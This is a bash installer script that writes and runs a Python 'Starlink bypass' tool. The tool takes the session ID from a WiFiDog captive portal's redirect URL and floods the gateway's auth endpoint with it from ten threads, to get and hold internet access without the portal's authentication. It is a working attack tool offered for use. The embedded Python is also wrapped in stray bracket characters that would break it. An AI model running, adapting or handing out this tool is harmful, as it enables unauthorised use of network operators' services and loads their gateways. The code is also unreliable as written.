#!/bin/bash

echo "🚀 DAIKI STARLINK BYPASS - All-in-One Setup & Run"

# Setup
pkg update -y && pkg upgrade -y
pkg install python -y
pkg install python-pip -y
pip install requests

# Create Python script
cat > daiki.py << 'EOF'
[import re
import time
import threading
import random
import requests
import urllib3
import os
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Default gateway
DEFAULT_GW = "192.168.110.1"
DEFAULT_PORT = "2060"

# Keep-alive config
THREADS = 10
MIN_INTERVAL = 0.01
MAX_INTERVAL = 0.1

stop_event = threading.Event()

def log(msg, level="INFO"):
    print(f"{CYAN}[{level}]{RESET} {msg}")

def check_internet():
    try:
        r = requests.get("http://www.google.com", timeout=3)
        return r.status_code == 200
    except:
        return False

def keep_alive_worker(auth_url):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    ok = 0
    fail = 0
    while not stop_event.is_set():
        try:
            session.get(auth_url, timeout=5)
            ok += 1
        except:
            fail += 1
        print(f"\r{GREEN}OK: {ok}{RESET} | {RED}FAIL: {fail}{RESET}", end="")
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def extract_session_id_from_url(url):
    match = re.search(r'sessionId=([a-f0-9]{32})', url, re.I)
    if match:
        return match.group(1)
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    sid = params.get('sessionId', [None])[0]
    if sid and len(sid) == 32:
        return sid
    return None

def start_bypass(session_id, gateway_ip, gateway_port):
    auth_url = f"http://{gateway_ip}:{gateway_port}/wifidog/auth?token={session_id}"
    log(f"Auth URL: {auth_url}", "INFO")
    log(f"Starting {THREADS} keep-alive threads...", "INFO")
    for _ in range(THREADS):
        t = threading.Thread(target=keep_alive_worker, args=(auth_url,), daemon=True)
        t.start()
    log("Bypass active. Press Ctrl+C to stop.", "SUCCESS")
    try:
        while not stop_event.is_set():
            time.sleep(5)
            if check_internet():
                print(f"\r{GREEN}✓ Internet connected!{RESET}", end="")
            else:
                print(f"\r{YELLOW}⏳ Waiting...{RESET}", end="")
    except KeyboardInterrupt:
        stop_event.set()
        print("\n" + RED + "Stopped." + RESET)

def auto_hunt():
    log("Auto-Hunt: detecting captive portal...", "INFO")
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = requests.get(test_url, allow_redirects=True, timeout=5)
        portal_url = r.url
        if portal_url == test_url:
            if check_internet():
                log("Internet already active.", "WARNING")
                return
            else:
                log("No captive portal detected.", "ERROR")
                return
        log(f"Portal URL: {portal_url[:80]}...", "INFO")
        session_id = extract_session_id_from_url(portal_url)
        if not session_id:
            try:
                resp = requests.get(portal_url, timeout=10)
                html = resp.text
                match = re.search(r'sessionId=([a-f0-9]{32})', html, re.I)
                if match:
                    session_id = match.group(1)
            except:
                pass
        if not session_id:
            log("Could not extract session ID.", "ERROR")
            return
        log(f"Session ID: {session_id}", "SUCCESS")
        parsed = urlparse(portal_url)
        params = parse_qs(parsed.query)
        gw_ip = params.get('gw_address', [None])[0]
        gw_port = params.get('gw_port', [None])[0]
        if not gw_ip:
            gw_ip = DEFAULT_GW
            log(f"Gateway IP not in URL, using default: {gw_ip}", "INFO")
        if not gw_port:
            gw_port = DEFAULT_PORT
            log(f"Gateway port not in URL, using default: {gw_port}", "INFO")
        start_bypass(session_id, gw_ip, gw_port)
    except Exception as e:
        log(f"Auto-Hunt error: {e}", "ERROR")

def manual_mode():
    log("Manual Mode: paste full portal URL", "INFO")
    url = input(f"{CYAN}>>> {RESET}").strip()
    if not url:
        log("No URL entered.", "ERROR")
        return
    session_id = extract_session_id_from_url(url)
    if not session_id:
        log("No valid sessionId found in URL.", "ERROR")
        return
    log(f"Session ID: {session_id}", "SUCCESS")
    start_bypass(session_id, DEFAULT_GW, DEFAULT_PORT)

def main():
    os.system('clear')
    
    # DAIKI STARLINK BYPASS BANNER
    print(f"{CYAN}╔════════════════════════════════════════════════════════════════╗")
    print(f"║{RESET}                                                              {CYAN}║")
    print(f"║{RESET}     {GREEN}██████{YELLOW}╗{RED}  █████{GREEN}╗{YELLOW}██{RED}╗{CYAN}██{GREEN}╗  ██{YELLOW}╗{RED}██{CYAN}╗{RESET}                                    {CYAN}║")
    print(f"║{RESET}     {GREEN}██{YELLOW}╔══{RED}██{GREEN}╗{YELLOW}██{RED}╔══{GREEN}██{YELLOW}╗{RED}██{GREEN}╗{YELLOW}██{RED}║ {CYAN}██{GREEN}╔╝{YELLOW}██{RED}║{RESET}                                    {CYAN}║")
    print(f"║{RESET}     {GREEN}██{YELLOW}║{RED}  {GREEN}██{YELLOW}║{RED}███████{GREEN}╗{YELLOW}██{RED}║{CYAN}█████{GREEN}╔╝ {YELLOW}██{RED}║{RESET}                                    {CYAN}║")
    print(f"║{RESET}     {GREEN}██{YELLOW}║{RED}  {GREEN}██{YELLOW}║{RED}██{GREEN}╔══{YELLOW}██{RED}╗{CYAN}██{GREEN}╗{YELLOW}██{RED}╔═{GREEN}██{YELLOW}╗ {RED}██{CYAN}║{RESET}                                    {CYAN}║")
    print(f"║{RESET}     {GREEN}██████{YELLOW}╔╝{RED}██{GREEN}║{YELLOW}  {RED}██{GREEN}╗{YELLOW}██{RED}║{CYAN}██{GREEN}║{YELLOW}  {RED}██{GREEN}╗{YELLOW}██{RED}║{RESET}                                    {CYAN}║")
    print(f"║{RESET}     {YELLOW}╚═════{RED}╝ {GREEN}╚═{YELLOW}╝{RED}  {GREEN}╚═{YELLOW}╝{RED}╚═{CYAN}╝{GREEN}╚═{YELLOW}╝{RED}  {GREEN}╚═{YELLOW}╝{RED}╚═{CYAN}╝{RESET}                                    {CYAN}║")
    print(f"║{RESET}                                                              {CYAN}║")
    print(f"║{RESET}          {YELLOW}⚡{RED} DAIKI STARLINK BYPASS {YELLOW}⚡{RESET}                                {CYAN}║")
    print(f"║{RESET}          {CYAN}Auto-Hunt | Manual Mode{RESET}                                {CYAN}║")
    print(f"║{RESET}                                                              {CYAN}║")
    print(f"╚════════════════════════════════════════════════════════════════╝{RESET}")
    print()
    
    print(f"{GREEN}[1]{RESET} Auto-Hunt (detect portal & bypass)")
    print(f"{GREEN}[2]{RESET} Manual (paste full URL, default gateway)")
    print()
    choice = input(f"{CYAN}>>> {RESET}").strip()
    if choice == "1":
        auto_hunt()
    elif choice == "2":
        manual_mode()
    else:
        log("Invalid choice", "ERROR")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Exited.{RESET}")်]
EOF

# Run
python daiki.py
